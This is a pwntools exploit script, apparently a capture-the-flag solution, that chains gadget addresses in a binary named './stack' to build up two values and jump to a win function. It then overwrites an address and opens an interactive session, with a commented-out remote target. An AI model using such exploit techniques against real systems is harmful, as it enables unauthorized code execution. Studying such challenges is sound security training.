from pwn import *

p = process(['./stack'])
# p = remote('81.69.250.115', 8888)
elf = ELF('./stack')


def transform_to_zero(n):
    steps = []
    while n != 0:
        if n % 2 == 0:
            n //= 2
            steps.append('*')
        else:
            n -= 1
            steps.append('+')
    return steps[::-1]


f1 = 0x401330 + 16
f2 = 0x401310 + 16
f3 = 0x401350 + 16
f4 = 0x401370 + 16
f5 = 0x401390 + 16
f6 = 0x4013c0 + 16
win = 0x4013e0

payload = p64(0)
payload += p64(f4)

target = 1936286821
steps = transform_to_zero(target)
for i in steps:
    if i == '+':
        payload += p64(f6)
    if i == '*':
        payload += p64(f3)

payload += p64(f1)
payload += p64(f4)

target = 1684107883
steps = transform_to_zero(target)
for i in steps:
    if i == '+':
        payload += p64(f6)
    if i == '*':
        payload += p64(f3)

payload += p64(win)

print(len(payload))

p.recvuntil(b'>>>')
p.sendline(payload)
p.recvuntil(b'>>>')
p.sendline(b'-2036')
p.recvuntil(b'>>>')
addr = p64(0x401390)
gdb.attach(p)
# pause()
p.send(addr)
p.interactive()
